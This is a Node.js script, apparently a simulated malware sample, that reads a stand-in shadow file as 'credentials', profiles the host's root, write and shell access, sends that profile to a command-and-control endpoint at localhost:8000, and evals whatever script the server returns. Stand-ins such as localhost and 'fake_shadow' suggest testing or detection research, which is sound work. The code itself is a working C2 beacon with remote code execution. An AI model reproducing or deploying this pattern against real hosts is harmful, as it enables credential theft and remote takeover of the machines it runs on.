const fs = require("fs");
const path = require("path");
const http = require("http");
const dns = require("dns").promises;
const os = require("os");

const shadowFilePath = path.join(__dirname, "fake_shadow");

if (os.type() !== "Linux") {
  console.log("Not a Linux system, exiting.");
  // process.exit(0);
  // return;
}

async function readShadowFile() {
  try {
    const data = await fs.promises.readFile(shadowFilePath, "utf8");
    console.log("Simulated credentials:", data);
    return data;
  } catch (err) {
    console.error("Failed to read the shadow file:", err);
    // process.exit(1);
  }
}

async function performDnsLookup(hostname) {
  try {
    const lookup = await dns.lookup(hostname);
    console.log(`DNS Lookup Result: ${JSON.stringify(lookup)}`);
  } catch (err) {
    console.log("DNS Lookup Failed:", err);
    return;
  }
}

function checkEvalAllowed() {
  try {
    eval("var testEval = true");
    return true;
  } catch (e) {
    console.log("Eval is not allowed in this environment");
    return false;
  }
}

function hasRootPermission() {
  return process.geteuid && process.geteuid() === 0;
}

function hasWriteAccess(filePath) {
  try {
    fs.accessSync(filePath, fs.constants.W_OK);
    return true;
  } catch (err) {
    return false;
  }
}

function isExecutionAllowed(filePath) {
  try {
    fs.accessSync(filePath, fs.constants.X_OK);
    return true;
  } catch (err) {
    return false;
  }
}

function isExecPermissionAvailable() {
  try {
    fs.accessSync("/bin/sh", fs.constants.X_OK);
    return true;
  } catch (err) {
    return false;
  }
}

async function informC2Server(osInfo) {
  const postOptions = {
    hostname: "localhost",
    port: 8000,
    path: "/inform",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
  };

  return new Promise((resolve, reject) => {
    const req = http.request(postOptions, (res) => {
      let responseData = "";

      res.on("data", (chunk) => {
        responseData += chunk;
      });

      res.on("end", () => {
        resolve(responseData);
      });
    });

    req.on("error", (error) => {
      reject("Error while making the inform request: " + error);
    });

    req.write(JSON.stringify(osInfo));
    req.end();
  });
}

function executeDataFromC2(data) {
  try {
    eval(data);
    console.log('Script execution successful');
  } catch (err) {
    console.error('Error during script execution:', err);
  }
}

(async () => {
  const data = await readShadowFile();
  await performDnsLookup("localhost");

  try {
    const scriptFilePath = __filename;
    const hasWriteAccessValue = hasWriteAccess(scriptFilePath);
    const isExecutionAllowedValue = isExecutionAllowed(scriptFilePath);
    const isExecPermissionAvailableValue = isExecPermissionAvailable();

    const osInfo = {
      osType: os.type(),
      osRelease: os.release(),
      hasRootPermission: hasRootPermission(),
      hasWriteAccess: hasWriteAccessValue,
      isExecutionAllowed: isExecutionAllowedValue,
      isExecPermissionAvailable: isExecPermissionAvailableValue,
    };

    const informResponse = await informC2Server(osInfo);
    console.log("Inform response: \n", informResponse);

    const evalAllowed = checkEvalAllowed();

    if (informResponse && evalAllowed) {
      executeDataFromC2(informResponse);
    } else {
      console.log(
        "Cannot execute fetched script as eval is not allowed or inform response is empty"
      );
    }
  } catch (err) {
    console.error("Error during script execution:", err);
  }
})();
